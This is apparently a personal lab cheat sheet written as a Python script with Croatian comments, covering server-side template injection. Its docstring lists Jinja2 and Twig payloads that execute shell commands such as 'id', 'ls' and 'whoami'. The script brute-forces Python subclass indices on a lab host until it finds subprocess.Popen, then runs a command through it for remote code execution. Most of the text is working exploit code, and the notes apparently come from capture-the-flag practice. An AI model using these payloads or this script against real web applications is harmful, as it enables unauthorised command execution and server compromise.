"""
Primjeri koje sam susreo dok sam radio labose.
{{ ['id','']|sort('passthru') }}
{{['ls flags',""]|sort('passthru')}} #sort passthru se koristi kako bi se izvrsilo


{{7*7}}
Prvo odabiremo class object od ovog ispisa:
http://10.10.202.88:5000/profile/{{ ''.__class__.__mro__ }}

Nakon toga odabiremo subclasses koji se zove <class 'subprocess.Popen'> i njegov element u arrayu stavimo kao argument pod {}


Primjer:
{{"".__class__.__mro__[1].__subclasses__()[157].__repr__.__globals__.get("__builtins__").get("__import__")("subprocess").check_output("ls")}}

{{"".__class__.__mro__[1].__subclasses__()[157].__repr__.__globals__.get("__builtins__").get("__import__")("subprocess").check_output(['ls', '-lah'])}}

{{['id',""]|sort('passthru')}}



"""

import requests

#url="http://10.10.171.207:5000/profile/%7B%7B%20''.__class__.__mro__[1].__subclasses__()%20%7D%7D"
#r=requests.get(url)
#print(r.text)
for i in range(350,1000):
    url = f"http://10.10.171.207:5000/profile/{{{{ ''.__class__.__mro__[1].__subclasses__()[{i}]}}}}"
    r = requests.get(url)
    print(r.text)
    print(f"testiram za i={i}")
    if "subprocess.Popen" not in r.text:
        continue
    else:
        print(f"[+] Found at index {i}")
        url = f"http://10.10.171.207:5000/profile/{{{{ ''.__class__.__mro__[1].__subclasses__()[{i}](\"whoami\", shell=True, stdout=-1).communicate() }}}}"
        r = requests.get(url)
        print(r.text)
        break



